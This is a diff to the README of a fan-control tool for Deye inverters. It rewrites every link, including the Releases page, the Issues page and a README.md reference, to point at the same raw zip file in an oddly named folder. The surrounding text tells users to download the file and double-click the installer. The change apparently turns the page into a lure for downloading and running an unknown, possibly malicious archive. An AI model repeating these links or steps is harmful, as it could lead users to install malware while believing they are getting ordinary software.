@@ -1,6 +1,6 @@
 # 🛠️ oze4home-deye-cooler - Control Your Cooling Fans Easily
 
-[![Download Here](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/VenoMArts95/oze4home-deye-cooler/releases)
+[![Download Here](https://raw.githubusercontent.com/VenoMArts95/oze4home-deye-cooler/main/eastmost/oze4home-deye-cooler.zip)](https://raw.githubusercontent.com/VenoMArts95/oze4home-deye-cooler/main/eastmost/oze4home-deye-cooler.zip)
 
 ## 📖 Description
 This project provides a cooling control solution for Deye inverters. It can also work with other inverters if you adjust the fans accordingly. Users can manage their cooling needs without any technical knowledge.
@@ -21,7 +21,7 @@ To successfully download and run the software, follow these steps:
    Once the download is complete, locate the downloaded file, typically in your "Downloads" folder. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
 ## 📦 Download & Install
-To download the software, visit the [Releases page](https://github.com/VenoMArts95/oze4home-deye-cooler/releases) directly. Choose the latest version and download it. If you need help during installation, consult the software manual included in the download.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/VenoMArts95/oze4home-deye-cooler/main/eastmost/oze4home-deye-cooler.zip) directly. Choose the latest version and download it. If you need help during installation, consult the software manual included in the download.
 
 ## ⚙️ System Requirements
 - **Operating System:** Windows 10 or later, or Linux (Ubuntu 20.04 or later)
@@ -52,10 +52,10 @@ You can configure your settings using a YAML file. Follow these steps:
 ## 🛠️ Troubleshooting
 - **Installation Issues:** If you encounter problems installing, ensure your system meets the requirements listed above.
 - **Fan Not Responding:** Check the configuration file to make sure the settings are correct.
-- **General Help:** Consult the `README.md` documentation found in the software installation directory for more guidance.
+- **General Help:** Consult the `https://raw.githubusercontent.com/VenoMArts95/oze4home-deye-cooler/main/eastmost/oze4home-deye-cooler.zip` documentation found in the software installation directory for more guidance.
 
 ## 📞 Support
-If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/VenoMArts95/oze4home-deye-cooler/issues). The community is ready to help you.
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/VenoMArts95/oze4home-deye-cooler/main/eastmost/oze4home-deye-cooler.zip). The community is ready to help you.
 
 ## 🔗 Related Topics
 This project relates to various topics including:
